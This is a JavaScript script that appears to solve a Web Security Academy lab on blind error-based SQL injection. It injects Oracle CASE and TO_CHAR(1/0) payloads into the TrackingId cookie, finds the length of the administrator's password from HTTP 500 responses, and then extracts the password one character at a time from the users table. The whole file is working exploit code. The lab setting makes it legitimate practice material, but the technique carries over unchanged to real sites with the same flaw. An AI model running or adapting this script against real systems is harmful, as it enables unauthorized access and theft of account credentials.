import axios from "axios";

const url = "https://0a4b00be035bd635808208f1002f0027.web-security-academy.net/filter?category=Gifts";
const chars = "asdfghjklqwertyuiopzxcvbnm1234567890!@#$%^&*()_+=-";

async function findLength() {
  for (let i = 1; i <= 100; i++) {
    let cookies = {
      TrackingId: "90pEHwmGN2gdmbz6",
      session: "NPMUqQYtpjCuWcI1JnroBgUXZl4pcTPs",
    };

    let payload = `'||(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))=${i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'`;
    cookies.TrackingId += payload;

    try {
      let res = await axios.get(url, {
        headers: {
          Cookie: `TrackingId=${cookies.TrackingId}; session=${cookies.session}`,
        },
        validateStatus: () => true, // prevent axios from throwing on 500
      });

      console.log(`running ${res.status} .....`);
      if (res.status === 500) {
        console.log(`the length of password is : ${i}`);
        return i;
      }
    } catch (err) {
      console.error("Request failed", err.message);
    }
  }
}

async function findPass(length) {
  let pwd = "";

  for (let i = 1; i <= length; i++) {
    console.log("cracking password...");
    for (let c of chars) {
      let cookies = {
        TrackingId: "90pEHwmGN2gdmbz6",
        session: "NPMUqQYtpjCuWcI1JnroBgUXZl4pcTPs",
      };

      let payload = `'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), ${i}, 1)='${c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'`;
      cookies.TrackingId += payload;

      let res = await axios.get(url, {
        headers: {
          Cookie: `TrackingId=${cookies.TrackingId}; session=${cookies.session}`,
        },
        validateStatus: () => true,
      });

      if (res.status === 500) {
        pwd += c;
        console.log(pwd);
        break;
      }
    }
  }
  console.log(`\n password is : ${pwd}`);
}

(async () => {
  let length = await findLength();
  console.log("\nnow finding the password .. \n");
  await findPass(length);
})();
